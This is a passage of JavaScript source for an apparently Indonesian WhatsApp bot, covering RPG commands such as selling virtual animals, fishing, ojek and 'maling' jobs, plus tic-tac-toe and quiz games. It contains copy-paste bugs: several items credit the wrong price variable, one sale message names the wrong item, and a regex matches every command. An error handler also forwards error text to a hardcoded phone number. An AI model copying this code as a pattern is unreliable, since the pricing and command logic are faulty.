qioreply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
} else qioreply( `Sapi Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'monyet':
if (db.data.users[m.sender].monyet >= count * 1) {
db.data.users[m.sender].money += Smonyet * count
db.data.users[m.sender].monyet -= count * 1
qioreply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
} else qioreply( `Monyet Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'babi':
if (db.data.users[m.sender].babi >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].babi -= count * 1
qioreply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
} else qioreply( `Babi Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'babihutan':
if (db.data.users[m.sender].babihutan >= count * 1) {
db.data.users[m.sender].money += Sbabihutan * count
db.data.users[m.sender].babihutan -= count * 1
qioreply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
} else qioreply( `Babi Hutan Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'ayam':
if (db.data.users[m.sender].ayam >= count * 1) {
db.data.users[m.sender].money += Sayam * count
db.data.users[m.sender].ayam -= count * 1
qioreply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
} else qioreply( `Ayam Kamu Tidak Cukup`.trim())
break
//mancing
case 'kepiting':
if (db.data.users[m.sender].kepiting >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].kepiting -= count * 1
qioreply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
} else qioreply( `Kepiting Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'ikan':
if (db.data.users[m.sender].ikan >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].ikan -= count * 1
qioreply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
} else qioreply( `Ikan Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'dory':
if (db.data.users[m.sender].dory >= count * 1) {
db.data.users[m.sender].money += Sdory * count
db.data.users[m.sender].dory -= count * 1
qioreply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
} else qioreply( `Ikan Dory Kamu Tidak Cukup`.trim())
break
//=================================================//

case 'gurita':
if (db.data.users[m.sender].gurita >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].gurita -= count * 1
qioreply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
} else qioreply( `Gurita Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'buntal':
if (db.data.users[m.sender].buntal >= count * 1) {
db.data.users[m.sender].money += Sbuntal * count
db.data.users[m.sender].buntal -= count * 1
qioreply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
} else qioreply( `Ikan Buntal Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'hiu':
if (db.data.users[m.sender].hiu >= count * 1) {
db.data.users[m.sender].money += Shiu * count
db.data.users[m.sender].hiu -= count * 1
qioreply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
} else qioreply( `Hiu Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'orca':
if (db.data.users[m.sender].orca >= count * 1) {
db.data.users[m.sender].money += Sorca * count
db.data.users[m.sender].orca -= count * 1
qioreply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
} else qioreply( `Paus Orca Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'lumba':
if (db.data.users[m.sender].lumba >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].lumba -= count * 1
qioreply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
} else qioreply( `Lumba Lumba Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'paus':
if (db.data.users[m.sender].paus >= count * 1) {
db.data.users[m.sender].money += Spaus * count
db.data.users[m.sender].paus -= count * 1
qioreply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
} else qioreply( `Paus Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'lobster':
if (db.data.users[m.sender].lobster >= count * 1) {
db.data.users[m.sender].money += Slobster * count
db.data.users[m.sender].lobster -= count * 1
qioreply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
} else qioreply( `Lobster Kamu Tidak Cukup`.trim())
break
 case 'udang':
if (db.data.users[m.sender].udang >= count * 1) {
db.data.users[m.sender].money += Sudang * count
db.data.users[m.sender].udang -= count * 1
qioreply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
} else qioreply( `Udang Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'cumi':
if (db.data.users[m.sender].cumi >= count * 1) {
db.data.users[m.sender].money += Scumi * count
db.data.users[m.sender].cumi -= count * 1
qioreply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
} else qioreply( `Cumi Kamu Tidak Cukup`.trim())
 break
//=================================================//
case 'botol':
if (db.data.users[m.sender].botol >= count * 1) {
db.data.users[m.sender].money += Sbotol * count
db.data.users[m.sender].botol -= count * 1
qioreply( `Sukses Menjual ${count} Cumi Dengan Harga ${Sbotol * count} Money `.trim())
} else qioreply( `Botol Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kaleng':
if (db.data.users[m.sender].kaleng >= count * 1) {
db.data.users[m.sender].money += Skaleng * count
db.data.users[m.sender].kaleng -= count * 1
qioreply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
} else qioreply( `Kaleng Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kardus':
if (db.data.users[m.sender].kardus >= count * 1) {
db.data.users[m.sender].money += Skardus * count
db.data.users[m.sender].kardus -= count * 1
qioreply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
} else qioreply( `Kardus Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'gelas':
if (db.data.users[m.sender].gelas >= count * 1) {
db.data.users[m.sender].money += Sgelas * count
db.data.users[m.sender].gelas -= count * 1
qioreply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
} else qioreply( `Gelas Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'plastik':
if (db.data.users[m.sender].plastik >= count * 1) {
db.data.users[m.sender].money += Splastik * count
db.data.users[m.sender].plastik -= count * 1
qioreply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
} else qioreply( `Plastik Kamu Tidak Cukup`.trim())
break
default:
return qioreply(Kchat)
}
break
default:
return qioreply(Kchat)
}

} else if (/sell|jual|/i.test(command)) {
const count = args[1] && args[1].length > 0 ? Math.min(99999999, Math.max(parseInt(args[1]), 1)) : !args[1] || args.length < 3 ? 1 : Math.min(1, count)
switch (type) { 
 case 'banteng':
if (db.data.users[m.sender].banteng >= count * 1) {
db.data.users[m.sender].money += Spaus * count
db.data.users[m.sender].banteng -= count * 1
qioreply( `Sukses Menjual ${count} Banteng Dengan Harga ${Sbanteng * count} Money `.trim())
} else qioreply( `Banteng Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'harimau':
if (db.data.users[m.sender].harimau >= count * 1) {
db.data.users[m.sender].money += Sharimau * count
db.data.users[m.sender].harimau -= count * 1
qioreply( `Sukses Menjual ${count} Harimau Dengan Harga ${Sharimau * count} Money `.trim())
} else qioreply( `Harimau Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'gajah':
if (db.data.users[m.sender].gajah >= count * 1) {
db.data.users[m.sender].money += Sgajah * count
db.data.users[m.sender].gajah -= count * 1
qioreply( `Sukses Menjual ${count} Gajah Dengan Harga ${Sgajah * count} Money `.trim())
} else qioreply( `Gajah Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kambing':
if (db.data.users[m.sender].kambing >= count * 1) {
db.data.users[m.sender].money += Skambing * count
db.data.users[m.sender].kambing -= count * 1
qioreply( `Sukses Menjual ${count} Kambing Dengan Harga ${Skambing * count} Money `.trim())
} else qioreply( `Kambing Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'panda':
if (db.data.users[m.sender].panda >= count * 1) {
db.data.users[m.sender].money += Spanda * count
db.data.users[m.sender].panda -= count * 1
qioreply( `Sukses Menjual ${count} Panda Dengan Harga ${Sbuaya * count} Money `.trim())
} else qioreply( `Panda Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'buaya':
if (db.data.users[m.sender].buaya >= count * 1) {
db.data.users[m.sender].money += Sbuaya * count
db.data.users[m.sender].buaya -= count * 1
qioreply( `Sukses Menjual ${count} Buaya Dengan Harga ${Sbuaya * count} Money `.trim())
} else qioreply( `Buaya Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kerbau':
if (db.data.users[m.sender].kerbau >= count * 1) {
db.data.users[m.sender].money += Skerbau * count
db.data.users[m.sender].kerbau -= count * 1
qioreply( `Sukses Menjual ${count} Kerbau Dengan Harga ${Skerbau * count} Money `.trim())
} else qioreply( `Kerbau Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'sapi':
if (db.data.users[m.sender].sapi >= count * 1) {
db.data.users[m.sender].money += Ssapi * count
db.data.users[m.sender].sapi -= count * 1
qioreply( `Sukses Menjual ${count} Sapi Dengan Harga ${Ssapi * count} Money `.trim())
} else qioreply( `Sapi Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'monyet':
if (db.data.users[m.sender].monyet >= count * 1) {
db.data.users[m.sender].money += Smonyet * count
db.data.users[m.sender].monyet -= count * 1
qioreply( `Sukses Menjual ${count} Monyet Dengan Harga ${Smonyet * count} Money `.trim())
} else qioreply( `Monyet Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'babi':
if (db.data.users[m.sender].babi >= count * 1) {
db.data.users[m.sender].money += Sbabi * count
db.data.users[m.sender].babi -= count * 1
qioreply( `Sukses Menjual ${count} Babi Dengan Harga ${Sbabi * count} Money `.trim())
} else qioreply( `Babi Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'babihutan':
if (db.data.users[m.sender].babihutan >= count * 1) {
db.data.users[m.sender].money += Sbabihutan * count
db.data.users[m.sender].babihutan -= count * 1
qioreply( `Sukses Menjual ${count} Babi Hutan Dengan Harga ${Sbabihutan * count} Money `.trim())
} else qioreply( `Babi Hutan Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'ayam':
if (db.data.users[m.sender].ayam >= count * 1) {
db.data.users[m.sender].money += Sayam * count
db.data.users[m.sender].ayam -= count * 1
qioreply( `Sukses Menjual ${count} Ayam Dengan Harga ${Sayam * count} Money `.trim())
} else qioreply( `Ayam Kamu Tidak Cukup`.trim())
break
//mancing
case 'kepiting':
if (db.data.users[m.sender].kepiting >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].kepiting -= count * 1
qioreply( `Sukses Menjual ${count} Kepiting Dengan Harga ${Skepiting * count} Money `.trim())
} else qioreply( `Kepiting Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'ikan':
if (db.data.users[m.sender].ikan >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].ikan -= count * 1
qioreply( `Sukses Menjual ${count} Ikan Dengan Harga ${Sikan * count} Money `.trim())
} else qioreply( `Ikan Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'dory':
if (db.data.users[m.sender].dory >= count * 1) {
db.data.users[m.sender].money += Sdory * count
db.data.users[m.sender].dory -= count * 1
qioreply( `Sukses Menjual ${count} Ikan Dory Dengan Harga ${Sdory * count} Money `.trim())
} else qioreply( `Ikan Dory Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'gurita':
if (db.data.users[m.sender].gurita >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].gurita -= count * 1
qioreply( `Sukses Menjual ${count} Gurita Dengan Harga ${Sgurita * count} Money `.trim())
} else qioreply( `Gurita Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'buntal':
if (db.data.users[m.sender].buntal >= count * 1) {
db.data.users[m.sender].money += Sbuntal * count
db.data.users[m.sender].buntal -= count * 1
qioreply( `Sukses Menjual ${count} Ikan Buntal Dengan Harga ${Sbuntal * count} Money `.trim())
} else qioreply( `Ikan Buntal Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'hiu':
if (db.data.users[m.sender].hiu >= count * 1) {
db.data.users[m.sender].money += Shiu * count
db.data.users[m.sender].hiu -= count * 1
qioreply( `Sukses Menjual ${count} Hiu Dengan Harga ${Shiu * count} Money `.trim())
} else qioreply( `Hiu Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'orca':
if (db.data.users[m.sender].orca >= count * 1) {
db.data.users[m.sender].money += Sorca * count
db.data.users[m.sender].orca -= count * 1
qioreply( `Sukses Menjual ${count} Paus Orca Dengan Harga ${Sorca * count} Money `.trim())
} else qioreply( `Paus Orca Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'lumba':
if (db.data.users[m.sender].lumba >= count * 1) {
db.data.users[m.sender].money += Skepiting * count
db.data.users[m.sender].lumba -= count * 1
qioreply( `Sukses Menjual ${count} Lumba Lumba Dengan Harga ${Slumba * count} Money `.trim())
} else qioreply( `Lumba Lumba Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'paus':
if (db.data.users[m.sender].paus >= count * 1) {
db.data.users[m.sender].money += Spaus * count
db.data.users[m.sender].paus -= count * 1
qioreply( `Sukses Menjual ${count} Paus Dengan Harga ${Spaus * count} Money `.trim())
} else qioreply( `Paus Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'lobster':
if (db.data.users[m.sender].lobster >= count * 1) {
db.data.users[m.sender].money += Slobster * count
db.data.users[m.sender].lobster -= count * 1
qioreply( `Sukses Menjual ${count} Lobster Dengan Harga ${Slobster * count} Money `.trim())
} else qioreply( `Lobster Kamu Tidak Cukup`.trim())
break
 case 'udang':
if (db.data.users[m.sender].udang >= count * 1) {
db.data.users[m.sender].money += Sudang * count
db.data.users[m.sender].udang -= count * 1
qioreply( `Sukses Menjual ${count} Udang Dengan Harga ${Sudang * count} Money `.trim())
} else qioreply( `Udang Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'cumi':
if (db.data.users[m.sender].cumi >= count * 1) {
db.data.users[m.sender].money += Scumi * count
db.data.users[m.sender].cumi -= count * 1
qioreply( `Sukses Menjual ${count} Cumi Dengan Harga ${Scumi * count} Money `.trim())
} else qioreply( `Cumi Kamu Tidak Cukup`.trim())
 break
//=================================================//
case 'botol':
if (db.data.users[m.sender].botol >= count * 1) {
db.data.users[m.sender].money += Sbotol * count
db.data.users[m.sender].botol -= count * 1
qioreply( `Sukses Menjual ${count} Botol Dengan Harga ${Sbotol * count} Money `.trim())
} else qioreply( `Botol Kamu Tidak Cukup`.trim())
break 
case 'kaleng':
if (db.data.users[m.sender].kaleng >= count * 1) {
db.data.users[m.sender].money += Skaleng * count
db.data.users[m.sender].kaleng -= count * 1
qioreply( `Sukses Menjual ${count} Kaleng Dengan Harga ${Skaleng * count} Money `.trim())
} else qioreply( `Kaleng Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'kardus':
if (db.data.users[m.sender].kardus >= count * 1) {
db.data.users[m.sender].money += Skardus * count
db.data.users[m.sender].kardus -= count * 1
qioreply( `Sukses Menjual ${count} Kardus Dengan Harga ${Skardus * count} Money `.trim())
} else qioreply( `Kardus Kamu Tidak Cukup`.trim())
break
 case 'gelas':
if (db.data.users[m.sender].gelas >= count * 1) {
db.data.users[m.sender].money += Sgelas * count
db.data.users[m.sender].gelas -= count * 1
qioreply( `Sukses Menjual ${count} Gelas Dengan Harga ${Sgelas * count} Money `.trim())
} else qioreply( `Gelas Kamu Tidak Cukup`.trim())
break
//=================================================//
case 'plastik':
if (db.data.users[m.sender].plastik >= count * 1) {
db.data.users[m.sender].money += Splastik * count
db.data.users[m.sender].plastik -= count * 1
qioreply( `Sukses Menjual ${count} Plastik Dengan Harga ${Splastik * count} Money `.trim())
} else qioreply( `Plastik Kamu Tidak Cukup`.trim())
break 
default:
return qioreply(Kchat)
}
}
} catch (err) {
console.log(util.format(err))
let e = String(err)
qio.sendMessage("923452696397@s.whatsapp.net", { text: "Hello developer, there seems to be an error, please fix it " + util.format(e), 
contextInfo:{
forwardingScore: 9999999, 
isForwarded: true
}})
}
}
break
//=================================================//
case 'ojek': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let order = db.data.users[m.sender].ojekk
let timers = clockString(_timers)
let name = qio.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Ojek'
qio.misi = qio.misi ? qio.misi: {}
if (id in qio.misi) {
qioreply( `Selesaikan Misi ${qio.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (new Date - db.data.users[m.sender].lastmisi > 3600000) {
let randomaku4 = Math.floor(Math.random() * 10)
let randomaku5 = Math.floor(Math.random() * 10)

let rbrb4 = (randomaku4 * 100000)
let rbrb5 = (randomaku5 * 1000)

var dimas = `
🚶⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️ 🛵
✔️ Mendapatkan orderan....
`.trim()

var dimas2 = `
🚶🛵⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬜⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️
➕ Mengantar ke tujuan....
`.trim()

var dimas3 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️
➕ Sampai di tujuan....
`.trim()

var dimas4 = `
⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛
⬛⬜⬜⬛⬛⬜⬜⬜⬛⬛
⬛⬛⬛⬛⬛⬛⬛🛵⬛⬛
🏘️🏘️🏘️🏘️🌳🌳 🏘️ 🚶
➕ 💹Menerima gaji....
`.trim()

var hsl = `
*—[ Hasil Ngojek ${name} ]—*
➕ 💹 Uang = [ ${rbrb4} ]
➕ ✨ Exp = [ ${rbrb5} ]
➕ 😍 Order Selesai = +1
➕ 📥Total Order Sebelumnya : ${order}
`.trim()

user.money += rbrb4
user.exp += rbrb5
user.ojekk += 1

qio.misi[id] = [
kerja,
setTimeout(() => {
delete qio.misi[id]
}, 27000)
]

setTimeout(() => {
qioreply(hsl)
}, 27000)

setTimeout(() => {
qioreply(dimas4)
}, 25000)

setTimeout(() => {
qioreply(dimas3)
}, 20000)

setTimeout(() => {
qioreply(dimas2)
}, 15000)

setTimeout(() => {
qioreply(dimas)
}, 10000)

setTimeout(() => {
qioreply('🔍Mencari pelanggan.....')
}, 0)
user.lastmisi = new Date * 1
} else m.reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=================================================//
case 'maling': {
if (!isGroup) return qioreply(mess.ingroup)
function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)


hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds

return hours + " jam " + minutes + " menit " + seconds + " detik"
}
const timeout = 604800000

let user = db.data.users[m.sender]
let time = user.lastmaling + 604800000
if (new Date - user.lastmaling< 604800000) return m.reply(`📮Anda sudah merampok bank\nTunggu selama ⏲️ ${msToTime(time - new Date())} lagi`)
let money = `${Math.floor(Math.random() * 30000)}`.trim()
let exp = `${Math.floor(Math.random() * 999)}`.trim()
let kardus = `${Math.floor(Math.random() * 1000)}`.trim()
user.money += money * 1
user.exp += exp * 1
user.kardus += kardus * 1
user.lastmaling = new Date * 1
m.reply(`Selamat kamu mendapatkan : \n💰+${money} Money\📦+${kardus} Kardus\n✨+${exp} Exp`)
setTimeout(() => {
m.reply(`Yuk waktunya Maling lagi 👋…`)
}, timeout)
}
break
//=================================================//
case 'mancing': {
if (!isGroup) return qioreply(mess.ingroup)
function clockString(ms) {
let h = Math.floor(ms / 3600000)
let m = Math.floor(ms / 60000) % 60
let s = Math.floor(ms / 1000) % 60
return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
let __timers = (new Date - db.data.users[m.sender].lastmisi)
let _timers = (3600000 - __timers)
let timers = clockString(_timers) 
let name = qio.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Memancing'
qio.misi = qio.misi ? qio.misi : {}
if (id in qio.misi) {
m.reply(`Selesaikan Misi ${qio.misi[id][0]} Terlebih Dahulu`)
throw false
}
if (user.umpan == 0) return qioreply('Kamu Membutuhkan Umpan 🪱 Untuk Memancing!')
if (user.fishingrod == 0 ) return qioreply('Kamu Harus Mempunyai Fishingrod 🎣 Terlebih Dahulu Jika Ingin Memancing')
if (new Date - user.lastmisi > 3600000) {
let ikan1 = Math.floor(Math.random() * 5)
let ikan2 = Math.floor(Math.random() * 5)
let ikan3 = Math.floor(Math.random() * 5)
let ikan4 = Math.floor(Math.random() * 5)
let ikan5 = Math.floor(Math.random() * 5)
let ikan6 = Math.floor(Math.random() * 5)
let ikan7 = Math.floor(Math.random() * 5)
let ikan8 = Math.floor(Math.random() * 5)
let ikan9 = Math.floor(Math.random() * 5)
let ikan10 = Math.floor(Math.random() * 5)
let ikan11 = Math.floor(Math.random() * 5)
 
let hsl = ` 
*📮 Hasil tangkapan Mu*
${ikan1 ? `
🦀 Kepiting: ${ikan1}` : ''} ${ikan2 ? `
🦞 Lobster: ${ikan2}` : ''} ${ikan3 ? `
🦐 Udang: ${ikan3}` : ''} ${ikan4 ? `
🦑 Cumi: ${ikan4}` : ''} ${ikan5 ? `
🐙 Gurita: ${ikan5}` : ''} ${ikan6 ? `
🐡 Buntal: ${ikan6}` : ''} ${ikan7 ? `
🐠 Dory: ${ikan7}` : ''} ${ikan8 ? `
🐳 Orca: ${ikan8}` : ''} ${ikan9 ? `
🐬 Lumba: ${ikan9}` : ''} ${ikan10 ? `
🐋 Paus: ${ikan10}` : ''} ${ikan11 ? `
🦈 Hiu: ${ikan11}` : ''}
`.trim()
user.kepiting += ikan1
user.lobster += ikan2
user.udang += ikan3
user.cumi += ikan4
user.gurita += ikan5
user.buntal += ikan6
user.dory += ikan7
user.orca += ikan8
user.lumba += ikan9
user.paus += ikan10
user.hiu += ikan11
user.fishingroddurability -= 10
user.umpan -= 1

qio.misi[id] = [
kerja,
setTimeout(() => {
delete qio.misi[id]
}, 20000)
]

setTimeout(() => {
qioreply(hsl)
}, 20000)

setTimeout(() => {
m.reply(`Ini Dia Hasil Tangkapanmu`)
}, 18000)

setTimeout(() => {
qioreply('Kamu Berhasil Menarik Ikan Keluar Dari Air')
}, 15000)

setTimeout(() => {
qioreply('Kamu Menarik Kailmu')
}, 12000)

setTimeout(() => {
qioreply('Kail Mu Di Tarik Ikan...')
}, 9000)

setTimeout(() => {
qioreply('Kamu Sedang Memancing...')
}, 0)
user.lastmisi = new Date * 1
} else m.reply(`Mohon Tunggu Selama ${timers} Sebelum Memulai Misi Kembali`)
}
break
//=================================================//
case 'nguli': {
if (!isGroup) return qioreply(mess.ingroup)
if (new Date - db.data.users[m.sender].lastnguli > 86400000) {
db.data.users[m.sender].limit += 10
qioreply('_🎉Selamat kamu mendapatkan +10 limit_')
db.data.users[m.sender].lastnguli = new Date * 1
} else qioreply('[💬] Anda sudah mengklaim upah nguli hari ini')
}
break
//=================================================//
case 'ttc':
case 'ttt':
case 'tictactoe': {
let TicTacToe = require("./lib/tictactoe");
this.game = this.game ? this.game : {};
if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return qioreply('Kamu masih didalam game');
let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true));
if (room) {
qioreply('Partner ditemukan!');
room.o = m.chat;
room.game.playerO = m.sender;
room.state = 'PLAYING';
let arr = room.game.render().map(v => {
return {
X: `❌`,
O: `⭕`,
1: `1️⃣`,
2: `2️⃣`,
3: `3️⃣`,
4: `4️⃣`,
5: `5️⃣`,
6: `6️⃣`,
7: `7️⃣`,
8: `8️⃣`,
9: `9️⃣`,
}[v];
});
let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Menunggu @${room.game.currentTurn.split('@')[0]}

Ketik *nyerah* untuk menyerah dan mengakui kekalahan`;
if (room.x !== room.o) await qio.sendText(room.x, str, m, {
mentions: parseMention(str)
});
await qio.sendText(room.o, str, m, {
mentions: parseMention(str)
});
} else {
room = {
id: 'tictactoe-' + (+new Date),
x: m.chat,
o: '',
game: new TicTacToe(m.sender, 'o'),
state: 'WAITING'
};
if (text) room.name = text;
qioreply('Menunggu partner' + (text ? ` mengetik command dibawah ini ${prefix}${command} ${text}` : ''));
this.game[room.id] = room;
}
}
break
//=================================================//
case 'delttc':
case 'delttt': {
this.game = this.game ? this.game : {};
try {
if (this.game) {
delete this.game;
qio.sendText(m.chat, `Berhasil delete session TicTacToe`, m);
} else if (!this.game) {
m.reply(`Session TicTacToe🎮 tidak ada`);
} else mewReply('?');
} catch (e) {
qioreply('rusak');
}
}
break;
case 'suitpvp': case 'suit': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) m.reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return m.reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return m.reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${kontributor[1]}`, m.chat, { mentions: [kontributor[1] + '@s.whatsapp.net'] })
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) throw `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await qio.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) qio.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break;
case 'kuismath':
case 'math': {
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let {
genMath,
modes
} = require('./lib/math.js');
if (!text) return m.reply(`Mode: ${Object.keys(modes).join(' | ')}\nContoh _useran: ${prefix}math medium`);
let result = await genMath(text.toLowerCase());
qio.sendText(m.chat, `*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nWaktu: ${(result.waktu / 1000).toFixed(2)} detik`, m).then(() => {
kuismath[m.sender.split('@')[0]] = result.jawaban;
});
await sleep(result.waktu);
if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
qioreply("Waktu Habis\nJawaban: " + kuismath[m.sender.split('@')[0]]);
delete kuismath[m.sender.split('@')[0]];
}
}
break;
case 'tebak': {
if (args[0] === 'gambar') {
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendMessage(m.chat, {
image: {
url: result.img
},
caption: `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${result.deskripsi}\nWaktu : 60s`
}, {
quoted: m
}).then(() => {
tebakgambar[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
if (tebakgambar.hasOwnProperty(m.sender.split('@')[0])) {
console.log("Jawaban: " + result.jawaban);
qio.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakgambar[m.sender.split('@')[0]]}`, m);
delete tebakgambar[m.sender.split('@')[0]];
}
} else if (args[0] === 'kata') {
if (tebakkata.hasOwnProperty(m.sender.split('@')[0])) return qioreply("Masih Ada Sesi Yang Belum Diselesaikan!");
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json');
let result = anu[Math.floor(Math.random() * anu.length)];
qio.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
tebakkata[m.sender.split('@')[0]] = result.jawaban.toLowerCase();
});
await sleep(60000);
